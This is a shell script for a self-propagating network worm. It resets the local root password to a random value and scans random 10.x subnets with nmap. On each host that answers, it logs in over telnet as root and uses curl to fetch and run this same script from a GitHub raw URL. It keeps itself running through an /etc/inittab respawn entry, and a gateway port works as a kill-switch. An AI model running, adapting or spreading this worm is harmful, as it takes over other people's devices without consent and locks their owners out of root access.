#!/bin/sh

# set non-blank, random root password, long enough to be annoying
PW=`echo $RANDOM $RANDOM $RANDOM $RANDOM | base64`
( sleep 1 ; echo $PW ; sleep 1 ; echo $PW ; sleep 1 ) | passwd

MYSUBNET=`busybox route -n | sed -nE 's/^(10\.[0-9]+)\.[0-9]+\.[0-9]+ .+$/\1/p'`
if [ -z "$NMAPTIMING" ] ; then NMAPTIMING="polite" ; fi

terminate() {
  # sysadmin can open port 19999 of the gateway to shut down
  # all instances on the network in case it gets abusive
  echo -n . | nc -w 1 $MYSUBNET.0.1 19999 > /dev/null 2>&1
}

talk() {
  sleep 3
  echo root
  sleep 1
  echo -n 'J=`mktemp` ;'
  echo -n 'curl https://raw.githubusercontent.com/ironiridis/creepy-alarming-lamp/master/cal.sh > $J ;'
  echo -n 'chmod +x $J ;'
  echo -n 'echo ttyS2::respawn:-$J >> /etc/inittab ;'
  echo -n 'kill -HUP 1 ;'
  echo 'exit'
  sleep 30
}

connectTo() {
  if [ -n "$VERBOSE" ] ; then echo "connectTo $1" ; fi
  talk | timeout -t 60 nc $1 23 > /dev/null
}

sweep() {
  let "N = $RANDOM % 256"
  SCAN="$MYSUBNET.$N.0/24"
  if [ -n "$VERBOSE" ] ; then echo "scan $SCAN" ; fi
  for H in `nmap -n -sP -T $NMAPTIMING -oG - $SCAN | sed -En 's/^Host: ([0-9.]+) .+Status: Up$/\1/p'`
    do connectTo $H
  done
}

if [ -z "$1" ] ; then while ! terminate ; do sweep ; done ; fi
connectTo $1
